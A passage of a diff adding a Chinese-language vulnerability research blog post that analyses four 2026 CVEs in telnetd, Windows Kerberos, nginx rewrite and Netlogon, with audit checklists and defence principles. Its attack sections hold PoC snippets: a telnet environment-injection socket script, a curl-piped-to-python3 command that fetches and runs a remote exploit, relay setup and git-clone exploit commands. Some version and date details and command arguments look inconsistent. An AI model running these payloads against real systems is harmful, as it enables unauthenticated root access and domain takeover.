@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>实现层混淆四重奏：环境变量注入、Unicode归一化绕过、子引擎状态重置、WCHAR/Byte错配 — DARKSEC</title>
+<meta name="description" content="GNU Inetutils telnetd USER=-f root认证绕过、Windows Kerberos Unicode归一化差异反射防护绕过、nginx rewrite子引擎is_args状态重置堆溢出、Netlogon CLDAP WCHAR/byte混淆栈溢出——四枚CVSS 9.8揭示实现层混淆的系统性威胁。">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 漏洞研究 / 实现层混淆攻击</div>
+        <h1>实现层混淆四重奏：环境变量注入、Unicode归一化绕过、子引擎状态重置、WCHAR/Byte错配 🐱💥</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-01</span>
+          <span>⏱ 22 min read</span>
+          <span>🏷 环境变量注入 / Unicode归一化 / 堆溢出 / 栈溢出</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">引言：实现层的四种「看错了」</a></li>
+            <li><a href="#env-inject">CVE-2026-24061：环境变量→CLI选项注入→telnetd root登录</a></li>
+            <li><a href="#unicode-normalize">CVE-2026-26128：Unicode归一化差异→Kerberos反射防护绕过</a></li>
+            <li><a href="#nginx-subengine">CVE-2026-42945：nginx子引擎状态重置→堆溢出RCE</a></li>
+            <li><a href="#wchar-byte">CVE-2026-41089：WCHAR/Byte混淆→Netlogon栈溢出</a></li>
+            <li><a href="#patterns">攻击模式提炼与审计方法论</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">引言：实现层的四种「看错了」 ⚡</h2>
+        <p>今天的四枚CVE全部CVSS 9.8，共同指向一个令人不安的事实：<strong>安全系统中最致命的漏洞往往不是逻辑设计错误，而是实现层面的「看错了」</strong>——环境变量的值被当作命令行选项、Unicode字符串在不同组件中被归一化为不同形式、子引擎创建时丢失了主引擎的关键标志位、字节数被当作字符数处理。每一种「看错」都悄无声息地绕过了看似完备的安全检查 nya~ 🐾</p>
+
+        <blockquote>
+          <p>🔥 <strong>核心洞察</strong>：这四种漏洞的共同根因是<strong>语义不一致</strong>——两个处理阶段对同一数据的「含义」理解不同。第一阶段认为数据是A，第二阶段认为是B，攻击者利用这个差异穿越安全边界。</p>
+        </blockquote>
+
+        <h2 id="env-inject">CVE-2026-24061：环境变量→CLI选项注入→telnetd root登录 🔓</h2>
+
+        <h3>漏洞概述</h3>
+        <p>GNU Inetutils telnetd在认证阶段通过环境变量传递用户身份信息（<code>USER</code>、<code>HOME</code>、<code>LOGNAME</code>），但未过滤以<code>-</code>开头的值。攻击者构造<code>USER=-f root</code>，<code>login</code>程序将其解析为「免密码以root登录」的选项——<strong>一个环境变量值直接绕过了整个认证</strong>。</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># 正常认证流程：
+# 客户端 → telnetd → setenv("USER", "alice") → exec("/bin/login")
+# → login 解析 USER=alice → 要求输入密码 → 认证成功
+#
+# 攻击流程：
+# 客户端 → telnetd → setenv("USER", "-f root") → exec("/bin/login")
+# → login 将 "-f root" 解析为命令行选项
+# → -f = "authenticate without password" (login的合法选项)
+# → root = 以root身份登录
+# → 直接获得root shell，无需任何密码！
+
+# PoC演示：
+# 1. 通过telnet协议发送环境变量
+python3 -c "
+import socket, struct
+
+s = socket.socket()
+s.connect(('target', 23))
+
+# Telnet协议: IAC SB NEW-ENVIRON SEND IAC SE
+# 注入 USER=-f root
+payload = b'\xff\xfa\x27\x01\x03USER\x01-f root\xff\xf0'
+s.send(payload)
+# ... 完成telnet握手后直接获得root shell
+"
+
+# 2. 更简单的PoC
+curl -s https://raw.githubusercontent.com/jacubes/CVE-2026-24061/main/poc.py | python3 -t target:23</code></pre>
+
+        <blockquote>
+          <p>🎯 <strong>核心洞察</strong>：环境变量是另一种形式的命令行参数。当守护进程将环境变量值传递给子进程时，子进程无法区分「来自环境变量的值」和「来自命令行的选项」。任何<code>环境变量→exec/system/popen</code>的传递链，如果不加<code>--</code>分隔符或转义，就是注入点。</p>
+        </blockquote>
+
+        <h3>受影响范围</h3>
+        <p>所有BSD/Linux telnetd实现（netkit-telnetd/inetutils-telnetd/telnet-bsd）、sshd的<code>AcceptEnv</code>/<code>PermitUserEnvironment</code>、Docker的<code>--env</code>→容器内entrypoint、CI/CD pipeline variables→脚本中的命令行参数注入。</p>
+
+        <h2 id="unicode-normalize">CVE-2026-26128：Unicode归一化差异→Kerberos反射防护绕过 🔐</h2>
+
+        <h3>漏洞概述</h3>
+        <p>Windows的Kerberos认证反射防护依赖一个假设：DNS解析的SPN主机名和LDAP查询的SPN主机名是同一个字符串，因此DC不会将票据反射给自身。但这个假设在Unicode字符面前崩溃——<code>DnsCache</code>服务和Domain Controller使用了<strong>不同的Unicode归一化算法</strong>。</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># 核心机制：两个组件对同一Unicode字符串归一化结果不同
+#
+# DnsCache: CompareStringW(NORM_IGNORECASE)
+#   "cⓞntoso-dc" → "cⓞntoso-dc" (带圈字符视为独立字符)
+#   → 触发DNS查询 → 解析到攻击者IP
+#
+# Domain Controller: LCMapStringEx(flags=0x31403)
+#   "cⓞntoso-dc" → "contoso-dc" (带圈字符归一化为普通字符)
+#   → 匹配自身SPN → 认为在连接自己
+
+# 攻击步骤：
+# 1. 创建机器账户（需要 MachineAccountQuota > 0）
+# 2. 在DNS中注册Unicode格式的A记录
+Add-DnsServerResourceRecordA -Name "cⓞntoso-dc" -ZoneName "corp.local" -IPv4Address "10.0.0.99"
+
+# 3. DC通过Kerberos向此Unicode主机名请求服务票据
+#    → DnsCache归一化后发起DNS查询 → 解析到攻击者IP
+#    → DC向攻击者发送AP-REQ
+
+# 4. 攻击者将AP-REQ relay到AD CS Web Enrollment
+#    → 获取DC证书 → PKINIT获取TGT → 域控接管！
+
+# 利用工具
+git clone https://github.com/jarnovandenbrink/CVE-2026-26128
+cd CVE-2026-26128
+python3 exploit.py -dc corp-dc -target "cⓞntoso-dc" -attacker 10.0.0.99</code></pre>
+
+        <blockquote>
+          <p>🔥 <strong>核心洞察</strong>：归一化函数的差异创造了一个「语义裂缝」——两个组件对同一字符串的「是否等于自己」给出不同答案。DC认为在连接自己，实际在连接攻击者。这种模式的通用性极高：任何需要比较两个字符串「是否相同」的安全检查，如果比较双方使用不同的归一化/编码/折叠规则，就可以被绕过。</p>
+        </blockquote>
+
+        <h3>审计方法</h3>
+        <p>枚举Windows认证协议中所有涉及主机名/SPN比较的代码路径→确认每个路径使用的Unicode归一化函数和flags→寻找不一致。重点关注：NTLM反射防护的challenge比较、Schannel的SNI匹配、LDAP的SASL绑定、AD CS的证书模板名称比较。</p>
+
+        <h2 id="nginx-subengine">CVE-2026-42945：nginx子引擎状态重置→堆溢出RCE 💀</h2>
+
+        <h3>漏洞概述</h3>
+        <p>nginx的rewrite模块使用两阶段求值。当<code>rewrite</code>指令中的<code>?</code>标志设定<code>is_args=1</code>（需要追加原始query string），而<code>set</code>指令捕获部分URI后，nginx创建一个<strong>零初始化子引擎</strong>来计算缓冲区大小。这个子引擎中<code>is_args=0</code>（上下文被重置），长度计算基于「无query string追加」的假设。但第二阶段在主引擎上运行，<code>is_args=1</code>→需要追加<code>?</code>+原始query参数→额外字节被写入。</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># nginx配置示例（触发条件）
+location /vulnerable {
+    rewrite ^/user/([^/]+)$ /profile/$1? last;  # ?标志设定 is_args=1
+    set $captured $uri;  # 触发子引擎创建
+}
+
+# 两阶段求值过程：
+# 第一阶段（度量阶段）：
+#   → 创建零初始化子引擎计算缓冲区大小
+#   → 子引擎中 is_args=0（被重置！）
+#   → 计算: len("/profile/alice") = 14 bytes
+#   → 不计算query string追加
+#
+# 第二阶段（复制阶段）：
+#   → 运行在主引擎上，is_args=1
+#   → 写入: "/profile/alice" + "?" + "foo=bar&baz=qux"
+#   → URI中的特殊字符触发转义扩展（+→%2B，3倍扩展）
+#   → 最终写入远超14 bytes → 堆缓冲区溢出！
+
+# 触发PoC
+curl "http://target/vulnerable?$(python3 -c "print('A'*4096 + '+'*1024)")"
+
+# 这个漏洞存活了15年（2008-2024，nginx 0.6.27-1.30.0）
+# 说明复杂解析器中两阶段求值的正确性极难验证</code></pre>
+
+        <blockquote>
+          <p>🎯 <strong>核心洞察</strong>：子引擎的「零初始化」不是安全特性而是安全缺陷——它重置了影响长度计算的关键标志位，导致两阶段看到不同的配置状态。与CVE-2026-42533（共享可变状态的并发修改）不同，此漏洞利用的是<strong>子引擎创建时的状态重置</strong>。防御方向：不应该创建零初始化的子引擎，而应<strong>复制</strong>主引擎的完整状态到子引擎。</p>
+        </blockquote>
+
+        <h3>审计方法</h3>
+        <p>找到所有「创建临时求值上下文→度量→销毁临时上下文→在主上下文执行」的代码路径→检查临时上下文中是否有标志位/状态变量未被从主上下文继承。同类目标：Apache httpd的mod_rewrite、HAProxy的ACL缓存引擎、Jinja2/Twig的子模板渲染。</p>
+
+        <h2 id="wchar-byte">CVE-2026-41089：WCHAR/Byte混淆→Netlogon栈溢出 💥</h2>
+
+        <h3>漏洞概述</h3>
+        <p>Windows Netlogon服务的CLDAP协议解析中，<code>NlGetLocalPingResponse()</code>分配528字节栈缓冲区后调用<code>BuildSamLogonResponse()</code>→该函数调用<code>NetpLogonPutUnicodeString()</code>逐字段写入服务器名、域名、GUID和<strong>攻击者控制的用户名</strong>。关键缺陷：<code>max_len</code>参数语义为<strong>字节数</strong>，但函数内部将其当作<strong>WCHAR数量</strong>（每个WCHAR=2字节）处理。</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># 函数签名（简化）：
+# NetpLogonPutUnicodeString(PWSTR *Output, USHORT max_len, PWCHAR String, USHORT StringLen)
+#
+# max_len 的语义：字节数（bytes）
+# 函数内部的使用：当作 WCHAR 数量（每个WCHAR = 2字节）
+#
+# 实际效果：
+#   max_len = 264 (字节) → 函数认为可以写 264 个 WCHAR = 528 字节
+#   实际缓冲区只有 528 字节
+#   但所有字段累计写入：服务器名(260B) + 域名(260B) + GUID(64B) + 用户名(260B+)
+#   → 远超 528 字节 → 栈缓冲区溢出
+
+# 攻击只需要一个UDP数据包，无需认证！
+# PoC（概念演示）：
+import socket
+
+# CLDAP Netlogon ping (UDP 389)
+# 构造超长用户名触发溢出
+username = "A" * 130  # 130字符 = 260字节wire format
+# ... 构造完整的CLDAP Netlogon请求
+# 发送一个UDP数据包 → LSASS崩溃 → DC reboot
+
+# 工具
+git clone https://github.com/0xABCD01/CVE-2026-41089
+python3 poc.py --target dc.corp.local --username "A"*130</code></pre>
+
+        <blockquote>
+          <p>🔥 <strong>核心洞察</strong>：单元混淆（unit confusion）不是溢出本身——而是长度检查被静默绕过的原因。不是没做边界检查，而是边界检查使用了错误的单位。<code>max_len</code>只是一个<code>int</code>，代码注释和变量名通常不注明单位（bytes vs chars）。Unicode处理是单元混淆的高发区——UTF-8 vs UTF-16 vs UCS-2 vs WCHAR之间的转换频繁发生单位混淆。</p>
+        </blockquote>
+
+        <h3>审计方法</h3>
+        <p>搜索代码中所有接受<code>max_len</code>/<code>buf_size</code>/<code>max_chars</code>参数的函数→追踪这些参数的实际语义单位→交叉验证调用方传入的值是否使用相同单位→使用静态分析工具标注每个长度变量的单位类型。重点关注：<code>sizeof(WCHAR)</code>/<code>* 2</code>/<code>/ 2</code>和缓冲区大小计算同时出现的代码、函数参数名暧昧（<code>cch</code> vs <code>cb</code> vs <code>len</code>）的函数。</p>
+
+        <h2 id="patterns">攻击模式提炼与审计方法论 🎯</h2>
+
+        <h3>四枚CVE的共同模式</h3>
+        <pre><code>┌─────────────────────────────────────────────────────────────┐
+│                  实现层混淆攻击的统一模型                      │
+├─────────────┬───────────────────────────────────────────────┤
+│ CVE-2026-   │ 语义裂缝                                      │
+│ 24061       │ 环境变量值 ≠ 命令行选项（但子进程无法区分）       │
+├─────────────┼───────────────────────────────────────────────┤
+│ CVE-2026-   │ Unicode归一化差异                               │
+│ 26128       │ DnsCache的"相等" ≠ DC的"相等"                   │
+├─────────────┼───────────────────────────────────────────────┤
+│ CVE-2026-   │ 状态继承缺失                                    │
+│ 42945       │ 主引擎的is_args=1 ≠ 子引擎的is_args=0           │
+├─────────────┼───────────────────────────────────────────────┤
+│ CVE-2026-   │ 单位混淆                                        │
+│ 41089       │ max_len的"字节" ≠ 函数内部的"WCHAR"              │
+└─────────────┴───────────────────────────────────────────────┘</code></pre>
+
+        <h3>通用审计清单</h3>
+        <pre><code># 1. 环境变量→CLI边界审计
+grep -rn "setenv\|putenv\|environ" src/ | grep -i "exec\|system\|popen"
+# → 检查值是否可能以"-"开头 → 是否加了"--"分隔符
+
+# 2. Unicode归一化一致性审计
+grep -rn "CompareString\|LCMapString\|NormalizeString\|FoldString" src/
+# → 枚举所有比较函数 → 确认flags参数是否一致
+
+# 3. 两阶段求值状态审计
+grep -rn "create.*context\|init.*engine\|alloc.*state" src/
+# → 找到临时上下文创建点 → 对比主上下文和临时上下文的标志位
+
+# 4. 单位混淆审计
+grep -rn "max_len\|buf_size\|max_chars\|cch\|cb " src/
+# → 追踪每个长度参数的语义单位 → 验证调用链中单位是否一致</code></pre>
+
+        <blockquote>
+          <p>🎯 <strong>防御原则</strong>：①环境变量传递给CLI程序时必须加<code>--</code>分隔符或转义以<code>-</code>开头的值；②同一系统内所有组件必须使用相同的Unicode归一化函数和flags；③临时求值上下文必须从主上下文<strong>复制</strong>完整状态，不能零初始化；④长度参数必须明确标注单位（bytes vs chars vs elements），最好用类型系统强制区分。</p>
+        </blockquote>
+
+        <h3>参考资料</h3>
+        <ul>
+          <li>CVE-2026-24061 — GNU Inetutils telnetd USER=-f root authentication bypass (CVSS 9.8)</li>
+          <li>CVE-2026-26128 — Windows Kerberos Unicode normalization differential→AD CS relay→domain compromise (CVSS 9.8)</li>
+          <li>CVE-2026-42945 — NGINX rewrite sub-engine is_args mismatch→heap buffer overflow→RCE (CVSS 9.8)</li>
+          <li>CVE-2026-41089 — Windows Netlogon CLDAP WCHAR/byte confusion→stack buffer overflow→LSASS crash (CVSS 9.8)</li>
+          <li>Synacktiv Research: <a href="https://www.synacktiv.com/en/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part">Bypassing Windows Authentication Reflection Mitigations</a></li>
+          <li>Aretiq AI: <a href="https://aretiq.ai/research/vul260513-cve-2026-41089">CVE-2026-41089 Reverse Analysis</a></li>
+        </ul>
+
+        <p>~ 感谢阅读 nya~ 🐱✨</p>
+      </div>
+
+      <div class="article-tags">
+        <span class="tag pink">环境变量注入</span>
+        <span class="tag">Unicode归一化</span>
+        <span class="tag purple">CVE-2026-24061</span>
+        <span class="tag purple">CVE-2026-26128</span>
+        <span class="tag purple">CVE-2026-42945</span>
+        <span class="tag purple">CVE-2026-41089</span>
+        <span class="tag yellow">堆溢出</span>
+        <span class="tag yellow">栈溢出</span>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+      <div style="text-align:center;margin-bottom:16px;">
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+        </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB <img src="/assets/images/cat-final.png" alt="cat" style="width:1.2em;height:1.2em;vertical-align:middle;"></p>
+      <p class="quote">「 漏洞不会消失，只会转移 nya~ 」</p>
+      <div class="links">
+        <a href="https://github.com/deft-dream" target="_blank">GitHub</a>
+        <span>·</span>
+        <a href="mailto:s815887892@163.com">Contact</a>
+      </div>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
